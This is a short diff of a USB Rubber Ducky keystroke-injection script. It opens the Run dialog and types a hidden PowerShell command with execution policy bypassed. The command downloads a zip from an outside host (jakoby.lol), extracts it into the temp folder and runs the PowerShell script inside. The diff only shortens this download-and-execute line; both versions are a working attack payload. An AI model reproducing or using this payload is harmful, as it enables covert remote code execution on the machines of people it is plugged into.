@@ -10,5 +10,5 @@ REM    -------------------------------------------------------------------------
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $downloadDirectory = "$env:tmp";iwr -Uri 'https://jakoby.lol/kiv' -OutFile "$downloadDirectory\js.zip";Expand-Archive "$downloadDirectory\js.zip" -DestinationPath $downloadDirectory -Force;. "$downloadDirectory\js\js.ps1"
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/kiv' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
 ENTER
